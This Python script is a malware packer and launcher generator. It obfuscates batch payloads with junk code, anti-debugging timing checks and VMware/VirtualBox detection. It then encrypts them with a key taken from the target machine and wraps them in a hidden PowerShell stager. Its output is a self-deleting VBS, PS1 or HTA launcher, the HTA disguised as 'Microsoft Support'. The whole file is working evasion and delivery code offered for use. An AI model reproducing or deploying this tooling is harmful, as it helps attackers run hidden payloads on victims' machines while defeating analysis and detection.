#!/usr/bin/env python3
import random
import string
import re
import argparse
import sys
import subprocess
import base64
import gzip
import logging
from pathlib import Path
from typing import List, Dict, Set, Tuple

# --- Global Configuration & Constants ---
LOG_FORMAT = '%(asctime)s - [%(levelname)s] - %(message)s'
ANTI_DEBUG_PING_COUNT = 3
ANTI_DEBUG_THRESHOLD_SECONDS = 5

# PowerShell payload template with dynamic decryption logic.
# Using Get-CimInstance for better compatibility with modern Windows.
POWERSHELL_TEMPLATE = """
$keyType = "{key_type}";
$envKey = "";

try {{
    if ($keyType -eq 'VOL_SERIAL') {{
        $envKey = (Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'").VolumeSerialNumber;
    }} elseif ($keyType -eq 'USERNAME') {{
        $envKey = $env:UserName;
    }}
    if ([string]::IsNullOrEmpty($envKey)) {{ throw; }}
}} catch {{
    # Silently exit if key retrieval fails.
    Exit;
}}

$b64 = "{b64_payload}";
$encryptedBytes = [System.Convert]::FromBase64String($b64);
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($envKey);
$decryptedBytes = New-Object byte[] $encryptedBytes.Length;

for ($i = 0; $i -lt $encryptedBytes.Length; $i++) {{
    $decryptedBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length];
}}

try {{
    $ms = New-Object System.IO.MemoryStream;
    $ms.Write($decryptedBytes, 0, $decryptedBytes.Length);
    $ms.Position = 0;
    $gs = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress);
    $sr = New-Object System.IO.StreamReader($gs);
    $payload = $sr.ReadToEnd();
    
    # Execute the payload in a hidden cmd process.
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo;
    $startInfo.FileName = "cmd.exe";
    $startInfo.Arguments = "/c " + $payload;
    $startInfo.UseShellExecute = $false;
    $startInfo.RedirectStandardInput = $false;
    $startInfo.RedirectStandardOutput = $false;
    $startInfo.RedirectStandardError = $false;
    $startInfo.CreateNoWindow = $true;

    $process = [System.Diagnostics.Process]::Start($startInfo);
}} catch {{
    # Also exit silently on error.
    Exit;
}}
"""

# --- Helper Functions ---

def setup_logging():
    """Configures logging with a standard format."""
    logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, stream=sys.stdout)

def junk_string(length: int = 10) -> str:
    """Generates a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_env_key(key_type: str) -> str:
    """
    Retrieves the environment-dependent key using robust commands.
    """
    try:
        if key_type == 'VOL_SERIAL':
            # PowerShell's Get-CimInstance is more reliable than the deprecated 'wmic'.
            command = 'powershell.exe -Command "(Get-CimInstance -ClassName Win32_LogicalDisk -Filter \\"DeviceID=\'C:\'\\").VolumeSerialNumber"'
            result = subprocess.run(command, capture_output=True, text=True, shell=True, check=True, encoding='utf-8', errors='ignore')
            key = result.stdout.strip()
            if key:
                return key
            raise ValueError("Volume Serial Number not found via PowerShell.")
        elif key_type == 'USERNAME':
            result = subprocess.run('whoami', capture_output=True, text=True, shell=True, check=True, encoding='utf-8', errors='ignore')
            return result.stdout.split('\\')[-1].strip()
        else:
            raise ValueError(f"Unknown key type: {key_type}")
    except (subprocess.CalledProcessError, FileNotFoundError, ValueError) as e:
        logging.error(f"Error retrieving environment key: {e}")
        sys.exit(1)

def xor_encrypt(data: bytes, key: str) -> bytes:
    """Performs XOR encryption on the given data and key."""
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    return bytes([b ^ key_bytes[i % key_len] for i, b in enumerate(data)])

# --- Obfuscation Layers ---

def generate_garbage_code(level: str) -> str:
    """Generates meaningless but syntactically correct batch commands."""
    var1, var2 = junk_string(6), junk_string(7)
    patterns = [
        f':: {junk_string(random.randint(20, 40))}\n',
        f'REM {junk_string(random.randint(25, 45))}\n',
        f'set "{var1}={junk_string(8)}"\n',
        f'if defined {var1} (set "{var2}=%time%")\n'
    ]
    if level in ['extreme', 'brutal']:
        var3, var4, label = junk_string(5), junk_string(5), junk_string(8)
        patterns.extend([
            f'set /a {var3}={random.randint(100, 999)} * {random.randint(10, 99)}\n',
            f'goto:{label}\n',
            f'dir C:\\Windows > nul\n',
            f':{label}\n',
            f'set {var4}=%random%\n'
        ])
    return random.choice(patterns)

def obfuscate_commands(lines: List[str]) -> Tuple[List[str], Dict[str, str]]:
    """Replaces common commands with randomized variables."""
    command_map = {}
    commands_to_hide = {'echo', 'set', 'if', 'goto', 'for', 'exit', 'call'}
    
    # Prepare command-to-variable mappings
    prologue = []
    for cmd in commands_to_hide:
        obf_name = junk_string(random.randint(8, 12))
        command_map[cmd] = obf_name
        prologue.append(f'set {obf_name}={cmd}\n')
        
    # Replace commands in the code
    obfuscated_lines = []
    for line in lines:
        stripped_line = line.strip()
        # Replace the command at the start of the line (case-insensitive)
        for original, obfuscated in command_map.items():
            if re.match(rf'^\s*{original}\b', stripped_line, re.IGNORECASE):
                line = re.sub(rf'^\s*{original}\b', f'!{obfuscated}!', stripped_line, 1, re.IGNORECASE) + '\n'
                break
        obfuscated_lines.append(line)
        
    return prologue, command_map

def obfuscate_variables_and_add_junk(lines: List[str], level: str) -> str:
    """Renames variables and inserts junk code."""
    final_code: List[str] = []
    var_map: Dict[str, str] = {}
    
    # 1. Collect all variables
    all_vars: Set[str] = set()
    for line in lines:
        all_vars.update(re.findall(r'%([a-zA-Z0-9_]+)%', line, re.IGNORECASE))
        all_vars.update(re.findall(r'set(?: /a)?\s+([a-zA-Z0-9_]+)=', line, re.IGNORECASE))
        all_vars.update(re.findall(r'for /f %%([a-zA-Z]) in', line, re.IGNORECASE))
        
    for var in all_vars:
        if var.lower() not in ['time', 'date', 'errorlevel', 'random', 'cmdcmdline']:
            var_map[var] = junk_string(random.randint(6, 10))

    lines_to_process = lines
    command_map = {}
    
    # 2. Obfuscate commands (if level is 'brutal')
    if level == 'brutal':
        prologue, command_map = obfuscate_commands(lines)
        final_code.extend(prologue)
        
    # 3. Replace variables/commands and insert junk
    for line in lines_to_process:
        stripped_line = line.strip()
        if not stripped_line or stripped_line.lower().startswith((':', '::', 'rem ')):
            continue
            
        final_code.append(generate_garbage_code(level))
        
        # Perform command replacement first
        if level == 'brutal':
            for original, obfuscated in command_map.items():
                if re.match(rf'^\s*{original}\b', stripped_line, re.IGNORECASE):
                    stripped_line = re.sub(rf'^\s*{original}\b', f'!{obfuscated}!', stripped_line, 1, re.IGNORECASE)
                    break

        # Then replace variables
        for original, obfuscated in var_map.items():
            stripped_line = re.sub(f'%{re.escape(original)}%', f'%{obfuscated}%', stripped_line, flags=re.IGNORECASE)
            stripped_line = re.sub(f'%%{re.escape(original)}', f'%%{obfuscated}', stripped_line, flags=re.IGNORECASE) # FOR loop variables
            stripped_line = re.sub(r'(?i)\b(set(?: /a)?\s+)' + re.escape(original) + r'(\s*=)', fr'\1{obfuscated}\2', stripped_line)
            
        final_code.append(stripped_line + '\n')
    
    return "".join(final_code)

# --- Anti-Analysis Techniques ---

def insert_anti_debug_checks(code_lines: List[str]) -> List[str]:
    """Inserts timing-check blocks to detect debuggers."""
    checked_code = []
    for line in code_lines:
        checked_code.append(line)
        if random.random() < 0.2: # Insert after ~20% of lines
            var_start, var_end, var_diff = junk_string(6), junk_string(6), junk_string(6)
            check = [
                f"set {var_start}=%time:~-5,2%%time:~-2%\n",
                f"ping -n {ANTI_DEBUG_PING_COUNT} 127.0.0.1 > nul\n",
                f"set {var_end}=%time:~-5,2%%time:~-2%\n",
                f"set /a {var_diff}={var_end} - {var_start}\n",
                f"if %{var_diff}% GTR {ANTI_DEBUG_THRESHOLD_SECONDS * 100} ( exit /b 1 )\n"
            ]
            checked_code.extend(check)
    return checked_code

def insert_vm_checks(code_lines: List[str]) -> List[str]:
    """Inserts blocks to detect virtual machine environments."""
    vm_check_code = [
        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum" | find "VMware" > nul && exit /b 1\n',
        'reg query "HKLM\\HARDWARE\\Description\\System" | find "VirtualBox" > nul && exit /b 1\n',
        'wmic csproduct get name | find "VirtualBox" > nul && exit /b 1\n' # 'wmic' is kept here for simplicity, as it's a common artifact check.
    ]
    # Insert checks at the beginning of the script for early exit.
    return vm_check_code + code_lines

# --- Launcher Generators ---

def create_final_payload(data: bytes, key_type: str) -> str:
    """Gzips, encrypts, and embeds the code into a PowerShell command."""
    compressed_data = gzip.compress(data)
    encryption_key = get_env_key(key_type)
    logging.info(f"Using encryption key: '{encryption_key}'")
    encrypted_data = xor_encrypt(compressed_data, encryption_key)
    b64_payload = base64.b64encode(encrypted_data).decode('utf-8')

    ps_script = POWERSHELL_TEMPLATE.format(b64_payload=b64_payload, key_type=key_type).replace('\n', ' ').replace('\r', '')
    encoded_ps_command = base64.b64encode(ps_script.encode('utf-16le')).decode('utf-8')
    
    return f"powershell.exe -NoP -NonI -W Hidden -E {encoded_ps_command}"

def generate_vbs_launcher(command: str, self_delete: bool) -> str:
    """Generates a VBScript launcher."""
    shell_var = junk_string(8)
    fso_var = junk_string(8)
    delete_code = ""
    if self_delete:
        delete_code = f'Set {fso_var} = CreateObject("Scripting.FileSystemObject")\nOn Error Resume Next\n{fso_var}.DeleteFile WScript.ScriptFullName, True\nOn Error Goto 0'
    
    return f'Set {shell_var} = CreateObject("WScript.Shell")\n' \
           f'{shell_var}.Run "{command}", 0, False\n' \
           f'{delete_code}'

def generate_ps1_launcher(command: str, self_delete: bool) -> str:
    """Generates a PowerShell (.ps1) launcher."""
    delete_code = ""
    if self_delete:
        delete_code = '\nStart-Sleep -Seconds 1; Remove-Item $MyInvocation.MyCommand.Path -Force'
        
    return f'$cmd = "{command}"\nInvoke-Expression $cmd{delete_code}'

def generate_hta_launcher(command: str, self_delete: bool) -> str:
    """Generates an HTA (HTML Application) launcher."""
    shell_var = junk_string(8)
    delete_code = ""
    if self_delete:
        # Self-deletion in HTA is tricky; this is a best-effort attempt.
        delete_code = f"""
        Sub SelfDelete()
            On Error Resume Next
            Dim objFSO
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            objFSO.DeleteFile(document.location.pathname), True
            On Error Goto 0
        End Sub
        Call SelfDelete()
        """

    return f"""
    <html><head><title>Microsoft Support</title></head>
    <body>
    <script language="VBScript">
        Set {shell_var} = CreateObject("WScript.Shell")
        {shell_var}.Run "{command}", 0, False
        window.close()
        {delete_code}
    </script>
    </body></html>
    """
    
# --- Main Program Logic ---

def main():
    setup_logging()
    
    parser = argparse.ArgumentParser(
        description="Advanced, environment-keyed, multi-stage Batch Obfuscator.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example: python py_obfuscator.py -i payload.bat -o start.vbs --env-key VOL_SERIAL --anti-vm --self-delete -l brutal"
    )
    parser.add_argument('-l', '--level', choices=['light', 'extreme', 'brutal'], default='brutal', help='Overall obfuscation level.')
    parser.add_argument('-i', '--input', type=Path, required=True, help='Path to the input .bat file.')
    parser.add_argument('-o', '--output', type=Path, required=True, help='Path for the output launcher (.vbs, .ps1, .hta).')
    parser.add_argument('--format', choices=['vbs', 'ps1', 'hta'], default='vbs', help='Format of the output launcher file.')
    parser.add_argument('--env-key', choices=['VOL_SERIAL', 'USERNAME'], required=True, help='Environment identifier used for encryption.')
    parser.add_argument('--anti-debug', action='store_true', help='Enables anti-debugging timing checks.')
    parser.add_argument('--anti-vm', action='store_true', help='Enables virtual machine detection.')
    parser.add_argument('--self-delete', action='store_true', help='The launcher deletes itself after execution.')
    
    args = parser.parse_args()

    try:
        logging.info(f"Reading '{args.input}'...")
        lines = args.input.read_text(encoding='utf-8', errors='ignore').splitlines(keepends=True)
    except Exception as e:
        logging.error(f"Error reading input file: {e}"); sys.exit(1)

    header = ["@echo off\n", "setlocal enableextensions enabledelayedexpansion\n"]
    
    logging.info(f"Obfuscating at '{args.level}' level...")
    obfuscated_bat_str = obfuscate_variables_and_add_junk(lines, args.level)
    obfuscated_bat_list = header + obfuscated_bat_str.splitlines(keepends=True)
    
    if args.anti_debug:
        logging.info("Inserting anti-debugging checks...")
        obfuscated_bat_list = insert_anti_debug_checks(obfuscated_bat_list)
    
    if args.anti_vm:
        logging.info("Inserting anti-VM checks...")
        obfuscated_bat_list = insert_vm_checks(obfuscated_bat_list)
    
    final_bat_code = "".join(obfuscated_bat_list).encode('utf-8')
    
    logging.info("Generating encrypted PowerShell stager (XOR + Gzip + Base64)...")
    final_command = create_final_payload(final_bat_code, args.env_key)

    logging.info(f"Assembling final '{args.format}' launcher...")
    launcher_content = ""
    if args.format == 'vbs':
        launcher_content = generate_vbs_launcher(final_command, args.self_delete)
    elif args.format == 'ps1':
        launcher_content = generate_ps1_launcher(final_command, args.self_delete)
    elif args.format == 'hta':
        launcher_content = generate_hta_launcher(final_command, args.self_delete)

    try:
        logging.info(f"Saving output to: '{args.output}'")
        args.output.write_text(launcher_content, encoding='utf-8')
        logging.info("\nSuccess! The multi-layered, environment-keyed launcher has been created.")
    except Exception as e:
        logging.error(f"Error writing output file: {e}"); sys.exit(1)

if __name__ == "__main__":
    main()
